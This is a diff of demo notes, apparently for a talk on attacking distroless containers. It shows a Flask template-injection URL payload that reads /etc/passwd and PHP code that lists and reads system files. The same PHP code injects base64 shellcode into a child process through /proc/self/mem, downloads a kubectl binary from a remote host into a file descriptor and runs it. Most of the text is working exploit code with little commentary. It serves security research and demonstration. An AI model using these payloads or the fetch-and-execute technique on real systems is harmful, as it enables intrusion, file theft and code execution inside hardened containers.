@@ -14,10 +14,6 @@ command -v openssl #https://www.form3.tech/engineering/content/exploiting-distro
 
 
 
-
-
-
-
 # Demo 1: Python RCE
 kubectl port-forward dless-flask-ssti-pod 3002:8080
 
@@ -63,7 +59,7 @@ exec(kubectl)
 # Demo 1.5: Python SSTI
 kubectl port-forward dless-flask-ssti-pod 3002:1337
 
-## If no sh, and nor RCE but SSTI, this is still possible with raw python
+## If no sh, and not RCE but SSTI, this is still possible with raw python
 http://127.0.0.1:3002/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["open"]("/etc/passwd").read()}}
 
 
@@ -196,4 +192,76 @@ fork("", [], {"execPath": "/proc/80/fd/20", "execArgv": []})
 
 
 
-# DEMO 3: PHP LFI
+# DEMO 3: PHP
+docker run -it --rm cgr.dev/chainguard/php -a
+
+## No way to execute binaries from php
+```php
+`ls`;
+`sh`;
+```
+
+## List folders & read files
+
+```php
+function listFilesInFolder($folderPath) {
+  if (is_dir($folderPath)) {
+    if ($dh = opendir($folderPath)) {
+      while (($file = readdir($dh)) !== false) {
+        echo "filename: $file : filetype: " . filetype($folderPath . $file) . "\n";
+      }
+      closedir($dh);
+    }
+  }
+}
+listFilesInFolder("/");
+echo file_get_contents("/etc/passwd");
+```
+
+## RCE
+
+```php
+# Execute binary
+
+$cmd_array = [
+    'php',
+    '-a'
+];
+
+$descriptorspec = array(
+    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
+    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
+    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
+);
+
+# The only wy in PHP to execute a binary without using a shell is using an array in proc_open
+$process = proc_open($cmd_array,$descriptorspec,$pipes);
+$status = proc_get_status($process);
+$pid = $status['pid'];
+
+# Execute shellcode in child process
+$payload = "\n".'$data = file_get_contents("/proc/self/syscall"); $data_array = explode(" ", $data); $mem_addr = trim($data_array[8]); $dec_offset = hexdec($mem_addr); $shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ="; $shellcode = base64_decode($shellcode_b64); $fd = fopen("/proc/self/mem", "r+"); fseek($fd,$dec_offset); fwrite($fd, $shellcode); fclose($fd);'."\n";
+fwrite($pipes[0], $payload);
+
+sleep(0.5);
+
+# Load kubectl in memfd
+file_put_contents("/proc/$pid/fd/2", file_get_contents("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl"));
+
+# Execute kubectl
+$cmd_array_kubectl = [
+    '/proc/$pid/fd/2',
+    '-h'
+];
+
+$descriptorspec_kubectl = array(
+    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
+    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
+    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
+);
+
+$process2 = proc_open($cmd_array_kubectl,$descriptorspec_kubectl,$pipes_kubectl);
+sleep(0.5);
+echo stream_get_contents($pipes_kubectl[1]);
+proc_close($process2);
+```
